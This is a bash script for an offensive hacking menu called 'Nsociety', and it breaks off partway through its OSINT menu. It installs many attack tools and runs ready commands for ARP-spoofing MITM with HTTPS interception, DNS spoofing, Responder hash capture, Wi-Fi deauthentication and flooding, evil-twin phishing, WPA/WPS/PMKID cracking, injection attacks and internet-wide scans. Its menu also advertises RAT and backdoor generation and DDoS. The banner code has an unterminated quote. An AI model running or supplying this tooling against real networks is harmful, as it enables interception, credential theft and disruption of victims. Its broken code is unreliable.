# This tool is made by C.T.A Teams (Cyber Threat Alliance)
# we advise you to not use this tool illegaly

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
WHITE='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'


INTERFACE=""
GATEWAY="192.168.1.1"
TARGET_IP=""
TARGET_NAME=""
LHOST=$(hostname -I | awk '{print $1}')
LPORT=4444
WIFI_INTERFACE=""
SESSION_DIR="/tmp/Nsociety"
mkdir -p "$SESSION_DIR"


show_banner() {
    clear
    echo -e "${RED}"
echo " ███╗   ██╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗"
echo " ████╗  ██║██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝"
echo " ██╔██╗ ██║███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ "
echo " ██║╚██╗██║╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  "
echo " ██║ ╚████║███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   "
echo " ╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   "
    echo -e "${CYAN}  ═══════════════════════════════════════════════════════
    echo -e "   Authorized Use Only — Authorized usage ONLY"
    echo -e "  ═══════════════════════════════════════════════════════${NC}"
    echo ""
}


check_and_install() {
    local tool=$1
    local pkg=$2
    if ! command -v "$tool" &>/dev/null; then
        echo -e "${YELLOW}[!] Installing $pkg...${NC}"
        sudo apt install -y "$pkg" 2>/dev/null
    fi
}

install_all_deps() {
    echo -e "${GREEN}[*] Checking and installing all dependencies...${NC}"
    
    local core_tools=(
        "netdiscover:netdiscover" "nmap:nmap" "masscan:masscan" "bettercap:bettercap"
        "aircrack-ng:aircrack-ng" "mdk3:mdk3" "mdk4:mdk4" "wifite:wifite"
        "reaver:reaver" "bully:bully" "pixiewps:pixiewps" "hcxdumptool:hcxdumptool"
        "hashcat:hashcat" "john:john" "hydra:hydra" "medusa:medusa"
        "crunch:crunch" "cewl:cewl" "rsmangler:rsmangler"
        "wireshark:wireshark" "tshark:tshark" "tcpdump:tcpdump"
        "responder:responder" "ettercap:ettercap-graphical"
        "metasploit:metasploit-framework" "msfvenom:metasploit-framework"
        "searchsploit:exploitdb" "gobuster:gobuster" "ffuf:ffuf"
        "wpscan:wpscan" "whatweb:whatweb" "nikto:nikto"
        "wafw00f:wafw00f" "xsser:xsser" "commix:commix"
        "sqlmap:sqlmap" "dirsearch:dirsearch"
        "theharvester:theharvester" "recon-ng:recon-ng" "amass:amass"
        "subfinder:subfinder" "httpx:httpx" "nuclei:nuclei"
        "setoolkit:setoolkit" "maltego:maltego"
        "sherlock:sherlock" "sublist3r:sublist3r"
        "zmap:zmap" "ntopng:ntopng" "kismet:kismet"
        "airgeddon:airgeddon" "fluxion:fluxion"
        "routersploit:routersploit" "sn1per:sn1per"
        "zaproxy:zaproxy" "burpsuite:burpsuite"
        "phoneinfoga:phoneinfoga" "spiderfoot:spiderfoot"
        "fern-wifi-cracker:fern-wifi-cracker" "zenmap:zenmap-kbx"
        "angryipscanner:angryipscanner" "wafw00f:wafw00f"
        "jsql-injection:jsql-injection" "cmsmap:cmsmap"
        "droopescan:droopescan" "findsploit:findsploit"
    )
    
    for item in "${core_tools[@]}"; do
        IFS=':' read -r cmd pkg <<< "$item"
        check_and_install "$cmd" "$pkg"
    done
    
    pip3 install droopescan 2>/dev/null
    pip3 install phoneinfoga 2>/dev/null
    
    [ ! -d "/opt/airgeddon" ] && sudo git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git /opt/airgeddon 2>/dev/null
    [ ! -d "/opt/fluxion" ] && sudo git clone https://github.com/FluxionNetwork/fluxion.git /opt/fluxion 2>/dev/null
    [ ! -d "/opt/wifiphisher" ] && sudo git clone https://github.com/wifiphisher/wifiphisher.git /opt/wifiphisher 2>/dev/null
    [ ! -d "/opt/routersploit" ] && sudo git clone https://github.com/threat9/routersploit.git /opt/routersploit 2>/dev/null
    [ ! -d "/opt/MITMf" ] && sudo git clone https://github.com/byt3bl33d3r/MITMf.git /opt/MITMf 2>/dev/null
    [ ! -d "/opt/CMSmap" ] && sudo git clone https://github.com/Dionach/CMSmap.git /opt/CMSmap 2>/dev/null
    [ ! -d "/opt/Findsploit" ] && sudo git clone https://github.com/1N3/Findsploit.git /opt/Findsploit 2>/dev/null
    [ ! -d "/opt/Sn1per" ] && sudo git clone https://github.com/1N3/Sn1per.git /opt/Sn1per 2>/dev/null
    [ ! -d "/opt/Sublist3r" ] && sudo git clone https://github.com/aboul3la/Sublist3r.git /opt/Sublist3r 2>/dev/null
    [ ! -d "/opt/sherlock" ] && sudo git clone https://github.com/sherlock-project/sherlock.git /opt/sherlock 2>/dev/null
    [ ! -d "/opt/spiderfoot" ] && sudo git clone https://github.com/smicallef/spiderfoot.git /opt/spiderfoot 2>/dev/null
    [ ! -d "/opt/NoSQLMap" ] && sudo git clone https://github.com/codingo/NoSQLMap.git /opt/NoSQLMap 2>/dev/null
    
    [ ! -f "/opt/linpeas.sh" ] && sudo wget -q https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh -O /opt/linpeas.sh && sudo chmod +x /opt/linpeas.sh
    [ ! -f "/opt/winpeas.exe" ] && sudo wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -O /opt/winpeas.exe
    
    [ -f "/usr/share/wordlists/rockyou.txt.gz" ] && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
    
    [ ! -d "/usr/share/seclists" ] && sudo apt install -y seclists 2>/dev/null
    
    echo -e "${GREEN}[✓] All dependencies installed!${NC}"
    sleep 2
}


detect_interfaces() {
    INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
    [ -z "$INTERFACE" ] && INTERFACE="eth0"
    WIFI_INTERFACE=$(iwconfig 2>/dev/null | grep "IEEE" | awk '{print $1}' | head -1)
    [ -z "$WIFI_INTERFACE" ] && WIFI_INTERFACE="wlan0"
    GATEWAY=$(ip route | grep default | awk '{print $3}')
    LHOST=$(hostname -I | awk '{print $1}')
}

main_menu() {
    while true; do
        show_banner
        detect_interfaces
        echo -e "${BOLD}${CYAN}Network:${NC} $INTERFACE | ${CYAN}WiFi:${NC} $WIFI_INTERFACE | ${CYAN}Gateway:${NC} $GATEWAY | ${CYAN}Your IP:${NC} $LHOST"
        echo ""
        echo -e "${BOLD}${YELLOW}╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "${BOLD}${YELLOW}║${NC}  ${WHITE}PROJECT Nsociety — MAIN MENU${NC}                        ${YELLOW}║${NC}"
        echo -e "${BOLD}${YELLOW}╠══════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[1]${NC}  DEVICE DISCOVERY — Find all devices + real names    ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[2]${NC}  NETWORK ATTACKS — MITM, ARP, sniff, inject          ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[3]${NC}  WIFI HACKING — WPA/WPA2, WPS, deauth, evil twin    ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[4]${NC}  WEB APPLICATION — SQLi, XSS, dirbust, CMS exploit   ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[5]${NC}  OSINT — People, domains, emails, phones, social    ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[6]${NC}  PASSWORD CRACKING — Hashcat, John, Hydra, rules    ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[7]${NC}  EXPLOITATION — Metasploit, payload gen, shellz     ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[8]${NC}  MOBILE HACKING — USB, Pegasus, ADB, SMS           ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[9]${NC}  ROUTER/IOT HACKING — RouterSploit, exploits        ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[10]${NC} RAT GENERATION — Reverse shells, backdoors         ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[11]${NC} POST-EXPLOITATION — Priv esc, persistence, loot    ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[12]${NC} DOS/DDOS — Network stress testing                  ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[13]${NC} BLUETOOTH HACKING — BT scan, exploit, spam         ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[14]${NC} FULL AUTOPWN — Scan + Exploit everything           ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[15]${NC} INSTALL ALL DEPENDENCIES                           ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[16]${NC} SYSTEM INFO + TOOL COUNTER                         ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC} ${RED}[0]${NC}  EXIT                                                ${YELLOW}║${NC}"
        echo -e "${BOLD}${YELLOW}╚══════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety]${NC} Select option: "
        read choice

        case $choice in
            1) device_discovery_menu ;;
            2) network_attack_menu ;;
            3) wifi_hacking_menu ;;
            4) web_application_menu ;;
            5) osint_menu ;;
            6) password_cracking_menu ;;
            7) exploitation_menu ;;
            8) mobile_hacking_menu ;;
            9) router_iot_menu ;;
            10) rat_generation_menu ;;
            11) post_exploitation_menu ;;
            12) dos_ddos_menu ;;
            13) bluetooth_menu ;;
            14) full_autopwn ;;
            15) install_all_deps ;;
            16) show_stats ;;
            0) echo -e "${RED}Exiting...${NC}"; exit 0 ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}


device_discovery_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  DEVICE DISCOVERY — Find Everything${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} Quick ARP Scan (netdiscover) — Fast device list"
        echo -e "${RED}[2]${NC} Deep Scan + Hostnames + OS (nmap -sn -O)"
        echo -e "${RED}[3]${NC} Bettercap Probe — Get mDNS/NetBIOS names"
        echo -e "${RED}[4]${NC} Masscan — Scan entire subnet for open ports"
        echo -e "${RED}[5]${NC} Zmap — Internet-scale scanning (use carefully)"
        echo -e "${RED}[6]${NC} Ntopng — Live network traffic dashboard"
        echo -e "${RED}[7]${NC} Angry IP Scanner — GUI device discovery"
        echo -e "${RED}[8]${NC} COMPREHENSIVE SCAN — All methods combined"
        echo -e "${RED}[9]${NC} Zenmap — Visual Nmap GUI"
        echo -e "${RED}[0]${NC} Back to Main Menu"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Device]${NC} Select: "
        read choice

        case $choice in
            1)
                echo -e "${CYAN}[*] Running netdiscover...${NC}"
                sudo netdiscover -r 192.168.1.0/24 -P
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                echo -e "${CYAN}[*] Running nmap deep scan (OS detection)...${NC}"
                sudo nmap -sn -O 192.168.1.0/24
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                echo -e "${CYAN}[*] Running Bettercap probe...${NC}"
                sudo bettercap -eval "net.probe on; sleep 8; net.show; quit"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                echo -ne "${YELLOW}Enter ports (e.g., 22,80,443): ${NC}"
                read ports
                sudo masscan 192.168.1.0/24 -p$ports --rate 1000
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -ne "${YELLOW}Enter port to scan globally: ${NC}"
                read port
                echo -e "${RED}[!] This will scan the internet! Confirm? (y/n)${NC}"
                read confirm
                [ "$confirm" == "y" ] && sudo zmap -p $port --output-file=/tmp/zmap_out.txt
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo -e "${CYAN}[*] Starting Ntopng...${NC}"
                sudo systemctl start ntopng 2>/dev/null
                echo -e "${GREEN}[+] Access at http://localhost:3000${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                sudo angryipscanner &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            8)
                comprehensive_discovery
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            9)
                sudo zenmap &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}

comprehensive_discovery() {
    echo -e "${BOLD}${GREEN}[*] COMPREHENSIVE DEVICE DISCOVERY${NC}"
    echo -e "${CYAN}[1/4] ARP Scan...${NC}"
    sudo netdiscover -r 192.168.1.0/24 -P -N 2>/dev/null | tail -n +3 > /tmp/Nsociety_arp.txt
    
    echo -e "${CYAN}[2/4] Nmap OS + Hostname Scan...${NC}"
    sudo nmap -sn -O 192.168.1.0/24 2>/dev/null | tee /tmp/Nsociety_nmap.txt
    
    echo -e "${CYAN}[3/4] Bettercap Name Resolution...${NC}"
    sudo timeout 20 bettercap -eval "net.probe on; sleep 12; net.show; quit" 2>/dev/null | tee /tmp/Nsociety_names.txt
    
    echo -e "${CYAN}[4/4] Service Discovery (top 100 ports)...${NC}"
    for ip in $(grep -oP '192\.168\.1\.\d+' /tmp/Nsociety_arp.txt | sort -u); do
        echo -e "${YELLOW}Scanning $ip...${NC}"
        sudo nmap -T5 --top-ports 100 -sV $ip 2>/dev/null | grep -E "^[0-9]|Service" >> /tmp/Nsociety_services.txt
    done
    
    echo -e "\n${BOLD}${GREEN}═══════════════════════════════════════════════════"
    echo -e "     DEVICE LIST WITH NAMES & SERVICES"
    echo -e "═══════════════════════════════════════════════════${NC}"
    
    declare -a DEV_IPS
    local idx=0
    while read ip; do
        idx=$((idx+1))
        DEV_IPS[$idx]=$ip
        vendor=$(grep "$ip" /tmp/Nsociety_arp.txt | awk '{$1=$2=$3=""; print $0}' | xargs 2>/dev/null)
        hostname=$(grep -B2 "$ip" /tmp/Nsociety_nmap.txt | grep "Host" | sed 's/.*(//; s/).*//' 2>/dev/null)
        services=$(grep "$ip" /tmp/Nsociety_services.txt | head -3 | tr '\n' ' ')
        
        echo -e "\n${BOLD}${YELLOW}[$idx]${NC} ${GREEN}$ip${NC}"
        echo -e "    ${BLUE}├─ Hostname:${NC} ${hostname:-Unknown}"
        echo -e "    ${BLUE}├─ MAC/Vendor:${NC} ${vendor:-Unknown}"
        echo -e "    ${BLUE}└─ Services:${NC} ${services:-N/A}"
    done < <(grep -oP '192\.168\.1\.\d+' /tmp/Nsociety_arp.txt | sort -t '.' -k4 -n -u)
    
    echo -e "\n${GREEN}[+] $idx devices found${NC}"
    
    echo -ne "\n${BOLD}${YELLOW}[?] Select target by number (0 to skip): ${NC}"
    read sel
    if [ "$sel" -ge 1 ] && [ "$sel" -le "$idx" ]; then
        TARGET_IP="${DEV_IPS[$sel]}"
        echo -e "${GREEN}[✓] Target set to $TARGET_IP${NC}"
    fi
}


network_attack_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  NETWORK ATTACKS${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} Bettercap Interactive — Full MITM console"
        echo -e "${RED}[2]${NC} Bettercap Quick ARP Spoof + Sniff"
        echo -e "${RED}[3]${NC} Bettercap HTTP/HTTPS Proxy + Inject JS"
        echo -e "${RED}[4]${NC} Ettercap GUI — ARP Poison + Sniff"
        echo -e "${RED}[5]${NC} Ettercap CLI — Quick MITM"
        echo -e "${RED}[6]${NC} MITMf — Session hijack + cred capture"
        echo -e "${RED}[7]${NC} Responder — LLMNR/NBT-NS poison + hash capture"
        echo -e "${RED}[8]${NC} Wireshark — Live packet capture"
        echo -e "${RED}[9]${NC} Tcpdump — CLI packet capture"
        echo -e "${RED}[10]${NC} Custom DNS Spoof (Bettercap)"
        echo -e "${RED}[11]${NC} Deauth Target (disconnect from network)"
        echo -e "${RED}[12]${NC} Evil Twin AP + Phishing Portal"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Network]${NC} Select: "
        read choice

        case $choice in
            1)
                echo -e "${CYAN}[*] Starting Bettercap interactive...${NC}"
                sudo bettercap
                ;;
            2)
                [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                sudo bettercap -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on"
                ;;
            3)
                [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                sudo bettercap -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; http.proxy on; https.proxy on"
                ;;
            4)
                sudo ettercap -G &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                sudo ettercap -T -M arp:remote /$GATEWAY/ /$TARGET_IP/
                ;;
            6)
                [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                cd /opt/MITMf 2>/dev/null && sudo python3 mitmf.py --arp --spoof --gateway $GATEWAY --target $TARGET_IP -i $INTERFACE
                ;;
            7)
                sudo responder -I $INTERFACE
                ;;
            8)
                sudo wireshark &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            9)
                echo -ne "${YELLOW}Filter (e.g., port 80): ${NC}"
                read filter
                sudo tcpdump -i $INTERFACE $filter -v
                ;;
            10)
                echo -ne "${YELLOW}Domain to spoof (e.g., google.com): ${NC}"
                read domain
                [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                sudo bettercap -eval "set arp.spoof.targets $TARGET_IP; set dns.spoof.domains $domain; dns.spoof on; arp.spoof on"
                ;;
            11)
                echo -ne "${YELLOW}Target MAC: ${NC}"
                read mac
                sudo aireplay-ng -0 5 -a $mac $WIFI_INTERFACE 2>/dev/null || \
                sudo bettercap -eval "wifi.deauth $mac"
                ;;
            12)
                echo -e "${CYAN}[*] Starting Airgeddon for Evil Twin...${NC}"
                sudo bash /opt/airgeddon/airgeddon.sh 2>/dev/null || \
                sudo bash /opt/fluxion/fluxion.sh 2>/dev/null
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


wifi_hacking_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  WIFI HACKING${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} WiFi Scan + Capture Handshake (airodump-ng)"
        echo -e "${RED}[2]${NC} Deauth Attack (aireplay-ng)"
        echo -e "${RED}[3]${NC} Crack WPA2 Handshake (aircrack-ng)"
        echo -e "${RED}[4]${NC} Wifite — Automatic WiFi Hacking"
        echo -e "${RED}[5]${NC} Airgeddon — Full Menu-Driven WiFi Suite"
        echo -e "${RED}[6]${NC} Fluxion — Evil Twin + Captive Portal"
        echo -e "${RED}[7]${NC} Wifiphisher — Rogue AP + Phishing"
        echo -e "${RED}[8]${NC} WPS Attack (Reaver/Bully)"
        echo -e "${RED}[9]${NC} PMKID Attack (hcxdumptool + hashcat)"
        echo -e "${RED}[10]${NC} MDK4 — WiFi DoS Flood"
        echo -e "${RED}[11]${NC} Monitor Mode Setup (airmon-ng)"
        echo -e "${RED}[12]${NC} Kismet — WiFi/BT Passive Scanner"
        echo -e "${RED}[13]${NC} Fern WiFi Cracker — GUI"
        echo -e "${RED}[14]${NC} Bettercap WiFi — Deauth + Probe"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>WiFi]${NC} Select: "
        read choice

        case $choice in
            1)
                sudo airmon-ng start $WIFI_INTERFACE
                echo -ne "${YELLOW}Enter channel (e.g., 6): ${NC}"; read ch
                echo -ne "${YELLOW}Enter BSSID (optional): ${NC}"; read bssid
                if [ -n "$bssid" ]; then
                    sudo airodump-ng -c $ch --bssid $bssid -w /tmp/handshake ${WIFI_INTERFACE}mon
                else
                    sudo airodump-ng ${WIFI_INTERFACE}mon
                fi
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                echo -ne "${YELLOW}Target BSSID: ${NC}"; read bssid
                sudo aireplay-ng -0 10 -a $bssid ${WIFI_INTERFACE}mon
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                echo -ne "${YELLOW}Capture file (.cap): ${NC}"; read cap
                sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt $cap
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                sudo wifite
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                sudo bash /opt/airgeddon/airgeddon.sh 2>/dev/null || echo -e "${RED}Airgeddon not found${NC}"
                ;;
            6)
                sudo bash /opt/fluxion/fluxion.sh 2>/dev/null || echo -e "${RED}Fluxion not found${NC}"
                ;;
            7)
                cd /opt/wifiphisher 2>/dev/null && sudo python3 wifiphisher.py || echo -e "${RED}Wifiphisher not found${NC}"
                ;;
            8)
                echo -ne "${YELLOW}Target BSSID: ${NC}"; read bssid
                echo -ne "${YELLOW}Channel: ${NC}"; read ch
                echo -e "${CYAN}[1] Reaver${NC}"
                echo -e "${CYAN}[2] Bully${NC}"
                read method
                [ "$method" == "1" ] && sudo reaver -i ${WIFI_INTERFACE}mon -b $bssid -c $ch -vv
                [ "$method" == "2" ] && sudo bully -b $bssid -c $ch ${WIFI_INTERFACE}mon
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            9)
                sudo airmon-ng start $WIFI_INTERFACE
                sudo hcxdumptool -i ${WIFI_INTERFACE}mon -o /tmp/pmkid.pcapng
                sudo hcxpcapngtool -o /tmp/hash.hc22000 /tmp/pmkid.pcapng
                sudo hashcat -m 22000 /tmp/hash.hc22000 /usr/share/wordlists/rockyou.txt
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            10)
                echo -e "${CYAN}[1] Deauth flood${NC}"
                echo -e "${CYAN}[2] Beacon flood (fake APs)${NC}"
                echo -e "${CYAN}[3] Auth flood${NC}"
                read flood_type
                echo -ne "${YELLOW}Channel: ${NC}"; read ch
                case $flood_type in
                    1) sudo mdk4 ${WIFI_INTERFACE}mon d -c $ch ;;
                    2) sudo mdk4 ${WIFI_INTERFACE}mon b -c $ch ;;
                    3) echo -ne "${YELLOW}BSSID: ${NC}"; read b; sudo mdk4 ${WIFI_INTERFACE}mon a -a $b ;;
                esac
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            11)
                sudo airmon-ng
                echo -ne "\n${YELLOW}Start monitor on? (interface): ${NC}"; read iface
                sudo airmon-ng start $iface
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            12)
                sudo kismet
                echo -e "${GREEN}[+] Access at http://localhost:2501${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            13)
                sudo fern-wifi-cracker &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            14)
                sudo bettercap -eval "wifi.recon on; sleep 10; wifi.show; quit"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


web_application_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  WEB APPLICATION HACKING${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} SQLMap — Automated SQL Injection"
        echo -e "${RED}[2]${NC} jSQL Injection — GUI SQLi"
        echo -e "${RED}[3]${NC} NoSQLMap — NoSQL Injection"
        echo -e "${RED}[4]${NC} XSSer — XSS Detection + Exploit"
        echo -e "${RED}[5]${NC} Commix — Command Injection"
        echo -e "${RED}[6]${NC} Directory Busting (Gobuster/FFuF/Dirsearch)"
        echo -e "${RED}[7]${NC} CMS Scanner (WPScan/Droopescan/CMSmap)"
        echo -e "${RED}[8]${NC} Nikto — Web Server Scanner"
        echo -e "${RED}[9]${NC} WhatWeb — Fingerprinting"
        echo -e "${RED}[10]${NC} WafW00f — Detect WAF"
        echo -e "${RED}[11]${NC} Burp Suite — Intercepting Proxy"
        echo -e "${RED}[12]${NC} OWASP ZAP — Automated Scanner"
        echo -e "${RED}[13]${NC} Nuclei — Template-Based Vuln Scanner"
        echo -e "${RED}[14]${NC} Findsploit — Search Exploit-DB for vulns"
        echo -e "${RED}[15]${NC} Sn1per — Full Auto Web Scan"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Web]${NC} Select: "
        read choice

        case $choice in
            1)
                echo -ne "${YELLOW}Target URL (e.g., http://site.com/page?id=1): ${NC}"; read url
                echo -e "${CYAN}[*] Testing for SQL injection...${NC}"
                sqlmap -u "$url" --batch
                echo -e "\n${CYAN}[*] List databases? (y/n)${NC}"; read dbq
                [ "$dbq" == "y" ] && sqlmap -u "$url" --dbs --batch
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                sudo jsql-injection &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                cd /opt/NoSQLMap 2>/dev/null && python3 nosqlmap.py || echo -e "${RED}NoSQLMap not found${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                echo -ne "${YELLOW}Target URL (e.g., http://site.com/page?q=test): ${NC}"; read url
                xsser -u "$url"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -ne "${YELLOW}Target URL: ${NC}"; read url
                commix -u "$url"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                echo -e "${CYAN}[1] Gobuster${NC}"
                echo -e "${CYAN}[2] FFuF${NC}"
                echo -e "${CYAN}[3] Dirsearch${NC}"
                read tool
                echo -ne "${YELLOW}URL: ${NC}"; read url
                case $tool in
                    1) gobuster dir -u "$url" -w /usr/share/wordlists/dirb/common.txt ;;
                    2) ffuf -u "$url/FUZZ" -w /usr/share/wordlists/dirb/common.txt ;;
                    3) cd /opt/dirsearch 2>/dev/null && python3 dirsearch.py -u "$url" || python3 -m dirsearch -u "$url" ;;
                esac
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            7)
                echo -e "${CYAN}[1] WPScan (WordPress)${NC}"
                echo -e "${CYAN}[2] Droopescan (Drupal)${NC}"
                echo -e "${CYAN}[3] CMSmap (Multi-CMS)${NC}"
                read tool
                echo -ne "${YELLOW}URL: ${NC}"; read url
                case $tool in
                    1) wpscan --url "$url" ;;
                    2) droopescan scan drupal -u "$url" ;;
                    3) cd /opt/CMSmap 2>/dev/null && python3 cmsmap.py "$url" ;;
                esac
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            8)
                echo -ne "${YELLOW}URL: ${NC}"; read url
                nikto -h "$url"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            9)
                echo -ne "${YELLOW}URL: ${NC}"; read url
                whatweb "$url"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            10)
                echo -ne "${YELLOW}URL: ${NC}"; read url
                wafw00f "$url"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            11)
                burpsuite &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            12)
                zaproxy &
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            13)
                echo -ne "${YELLOW}URL: ${NC}"; read url
                nuclei -u "$url" -severity critical,high
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            14)
                cd /opt/Findsploit 2>/dev/null && ./findsploit || echo -e "${RED}Findsploit not found${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            15)
                sniper -t $(echo -ne "${YELLOW}Target: ${NC}" && read t && echo $t)
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


osint_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  OSINT — OPEN SOURCE INTELLIGENCE${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} theHarvester — Emails, domains, names"
        echo -e "${RED}[2]${NC} Recon-ng — Full reconnaissance framework"
        echo -e "${RED}[3]${NC} Maltego — Link analysis graph"
        echo -e "${RED}[4]${NC} SpiderFoot — Automated OSINT (web UI)"
        echo -e "${RED}[5]${NC} Sherlock — Username across 400+ sites"
        echo -e "${RED}[6]${NC} PhoneInfoga — Phone number OSINT"
